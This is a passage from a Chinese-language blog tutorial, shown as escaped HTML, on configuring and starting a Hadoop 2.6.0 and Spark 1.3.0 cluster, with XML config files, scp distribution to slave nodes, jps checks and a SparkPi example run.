&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;mapreduce.framework.name&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;yarn&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;修改&lt;code&gt;yarn-site.xml&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;yarn.nodemanager.aux-services&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;mapreduce_shuffle&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;yarn.nodemanager.aux-services.mapreduce.shuffle.class&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;org.apache.hadoop.mapred.ShuffleHandler&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;yarn.resourcemanager.address&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;master:8032&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;yarn.resourcemanager.scheduler.address&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;master:8030&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;yarn.resourcemanager.resource-tracker.address&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;master:8035&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;yarn.resourcemanager.admin.address&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;master:8033&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;yarn.resourcemanager.webapp.address&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;name&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;master:8088&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;value&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;property&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;configuration&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;将配置好的&lt;code&gt;hadoop-2.6.0&lt;/code&gt;文件夹分发给所有slaves吧&lt;br&gt;&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scp -r ~&lt;span class=&quot;regexp&quot;&gt;/workspace/hadoop&lt;/span&gt;-&lt;span class=&quot;number&quot;&gt;2.6&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; spark&lt;span class=&quot;variable&quot;&gt;@slave1&lt;/span&gt;&lt;span class=&quot;symbol&quot;&gt;:~/workspace/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;启动-Hadoop&quot;&gt;&lt;a href=&quot;#启动-Hadoop&quot; class=&quot;headerlink&quot; title=&quot;启动 Hadoop&quot;&gt;&lt;/a&gt;启动 Hadoop&lt;/h3&gt;&lt;p&gt;在 master 上执行以下操作，就可以启动 hadoop 了。&lt;br&gt;&lt;figure class=&quot;highlight livecodeserver&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd ~/workspace/hadoop&lt;span class=&quot;number&quot;&gt;-2.6&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.0&lt;/span&gt;     &lt;span class=&quot;comment&quot;&gt;#进入hadoop目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bin/hadoop namenode -&lt;span class=&quot;built_in&quot;&gt;format&lt;/span&gt;     &lt;span class=&quot;comment&quot;&gt;#格式化namenode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sbin/&lt;span class=&quot;built_in&quot;&gt;start&lt;/span&gt;-dfs.sh               &lt;span class=&quot;comment&quot;&gt;#启动dfs &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sbin/&lt;span class=&quot;built_in&quot;&gt;start&lt;/span&gt;-yarn.sh              &lt;span class=&quot;comment&quot;&gt;#启动yarn&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;验证-Hadoop-是否安装成功&quot;&gt;&lt;a href=&quot;#验证-Hadoop-是否安装成功&quot; class=&quot;headerlink&quot; title=&quot;验证 Hadoop 是否安装成功&quot;&gt;&lt;/a&gt;验证 Hadoop 是否安装成功&lt;/h3&gt;&lt;p&gt;可以通过&lt;code&gt;jps&lt;/code&gt;命令查看各个节点启动的进程是否正常。在 master 上应该有以下几个进程：&lt;br&gt;&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$ &lt;/span&gt;jps  &lt;span class=&quot;comment&quot;&gt;#run on master&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3407&lt;/span&gt; SecondaryNameNode&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3218&lt;/span&gt; NameNode&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3552&lt;/span&gt; ResourceManager&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3910&lt;/span&gt; Jps&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在每个slave上应该有以下几个进程：&lt;br&gt;&lt;figure class=&quot;highlight mipsasm&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;keyword&quot;&gt;jps &lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;#run on slaves&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;2072&lt;/span&gt; NodeManager&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;2213&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Jps&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;1962&lt;/span&gt; DataNode&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;或者在浏览器中输入 &lt;a href=&quot;http://master:8088&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://master:8088&lt;/a&gt; ，应该有 hadoop 的管理界面出来了，并能看到 slave1 和 slave2 节点。&lt;/p&gt;
&lt;h2 id=&quot;Spark安装&quot;&gt;&lt;a href=&quot;#Spark安装&quot; class=&quot;headerlink&quot; title=&quot;Spark安装&quot;&gt;&lt;/a&gt;Spark安装&lt;/h2&gt;&lt;h3 id=&quot;下载解压-1&quot;&gt;&lt;a href=&quot;#下载解压-1&quot; class=&quot;headerlink&quot; title=&quot;下载解压&quot;&gt;&lt;/a&gt;下载解压&lt;/h3&gt;&lt;p&gt;进入&lt;a href=&quot;http://spark.apache.org/downloads.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官方下载地址&lt;/a&gt;下载最新版 Spark。我下载的是 &lt;a href=&quot;http://mirror.bit.edu.cn/apache/spark/spark-1.3.0/spark-1.3.0.tgz&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;spark-1.3.0-bin-hadoop2.4.tgz&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;~/workspace&lt;/code&gt;目录下解压&lt;br&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;-zxvf&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;spark-1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.3&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0-bin-hadoop2&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.4&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.tgz&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;spark-1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.3&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0-bin-hadoop2&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.4&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;spark-1&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.3&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0&lt;/span&gt;    #原来的文件名太长了，修改下&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;配置-Spark&quot;&gt;&lt;a href=&quot;#配置-Spark&quot; class=&quot;headerlink&quot; title=&quot;配置 Spark&quot;&gt;&lt;/a&gt;配置 Spark&lt;/h3&gt;&lt;figure class=&quot;highlight stylus&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd ~/workspace/spark-&lt;span class=&quot;number&quot;&gt;1.3&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;/conf    #进入spark配置目录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cp spark-env&lt;span class=&quot;selector-class&quot;&gt;.sh&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.template&lt;/span&gt; spark-env&lt;span class=&quot;selector-class&quot;&gt;.sh&lt;/span&gt;   #从配置模板复制&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;vi spark-env&lt;span class=&quot;selector-class&quot;&gt;.sh&lt;/span&gt;     #添加配置内容&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在&lt;code&gt;spark-env.sh&lt;/code&gt;末尾添加以下内容（这是我的配置，你可以自行修改）：&lt;br&gt;&lt;figure class=&quot;highlight dts&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;export SCALA_HOME=&lt;span class=&quot;meta-keyword&quot;&gt;/home/&lt;/span&gt;spark&lt;span class=&quot;meta-keyword&quot;&gt;/workspace/&lt;/span&gt;scala&lt;span class=&quot;number&quot;&gt;-2.10&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export JAVA_HOME=&lt;span class=&quot;meta-keyword&quot;&gt;/home/&lt;/span&gt;spark&lt;span class=&quot;meta-keyword&quot;&gt;/workspace/&lt;/span&gt;jdk1&lt;span class=&quot;number&quot;&gt;.7&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.0&lt;/span&gt;_75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export HADOOP_HOME=&lt;span class=&quot;meta-keyword&quot;&gt;/home/&lt;/span&gt;spark&lt;span class=&quot;meta-keyword&quot;&gt;/workspace/&lt;/span&gt;hadoop&lt;span class=&quot;number&quot;&gt;-2.6&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;export HADOOP_CONF_DIR=$HADOOP_HOME&lt;span class=&quot;meta-keyword&quot;&gt;/etc/&lt;/span&gt;hadoop&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SPARK_MASTER_IP=master&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SPARK_LOCAL_DIRS=&lt;span class=&quot;meta-keyword&quot;&gt;/home/&lt;/span&gt;spark&lt;span class=&quot;meta-keyword&quot;&gt;/workspace/&lt;/span&gt;spark&lt;span class=&quot;number&quot;&gt;-1.3&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;SPARK_DRIVER_MEMORY=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;G&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;注：在设置Worker进程的CPU个数和内存大小，要注意机器的实际硬件条件，如果配置的超过当前Worker节点的硬件条件，Worker进程会启动失败。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vi slaves&lt;/code&gt;在slaves文件下填上slave主机名：&lt;br&gt;&lt;figure class=&quot;highlight nginx&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attribute&quot;&gt;slave1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;slave2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;将配置好的&lt;code&gt;spark-1.3.0&lt;/code&gt;文件夹分发给所有slaves吧&lt;br&gt;&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scp -r ~&lt;span class=&quot;regexp&quot;&gt;/workspace/spark&lt;/span&gt;-&lt;span class=&quot;number&quot;&gt;1.3&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; spark&lt;span class=&quot;variable&quot;&gt;@slave1&lt;/span&gt;&lt;span class=&quot;symbol&quot;&gt;:~/workspace/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;启动Spark&quot;&gt;&lt;a href=&quot;#启动Spark&quot; class=&quot;headerlink&quot; title=&quot;启动Spark&quot;&gt;&lt;/a&gt;启动Spark&lt;/h3&gt;&lt;figure class=&quot;highlight vim&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sbin/start-&lt;span class=&quot;keyword&quot;&gt;all&lt;/span&gt;.&lt;span class=&quot;keyword&quot;&gt;sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;验证-Spark-是否安装成功&quot;&gt;&lt;a href=&quot;#验证-Spark-是否安装成功&quot; class=&quot;headerlink&quot; title=&quot;验证 Spark 是否安装成功&quot;&gt;&lt;/a&gt;验证 Spark 是否安装成功&lt;/h3&gt;&lt;p&gt;用&lt;code&gt;jps&lt;/code&gt;检查，在 master 上应该有以下几个进程：&lt;br&gt;&lt;figure class=&quot;highlight crmsh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ jps&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;7949&lt;/span&gt; Jps&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;7328&lt;/span&gt; SecondaryNameNode&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;7805&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;Master&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;title&quot;&gt;7137&lt;/span&gt; NameNode&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;7475&lt;/span&gt; ResourceManager&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在 slave  上应该有以下几个进程：&lt;br&gt;&lt;figure class=&quot;highlight xquery&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$jps&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3132&lt;/span&gt; DataNode&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3759&lt;/span&gt; Worker&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3858&lt;/span&gt; Jps&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3231&lt;/span&gt; NodeManager&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;进入Spark的Web管理页面： &lt;a href=&quot;http://master:8080&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://master:8080&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/mw690/81b78497jw1eqwa7uqndoj20za0p8afa.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;运行示例&quot;&gt;&lt;a href=&quot;#运行示例&quot; class=&quot;headerlink&quot; title=&quot;运行示例&quot;&gt;&lt;/a&gt;运行示例&lt;/h3&gt;&lt;figure class=&quot;highlight crystal&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#本地模式两线程运行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;./bin/run-example SparkPi &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt; --master local[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#Spark Standalone 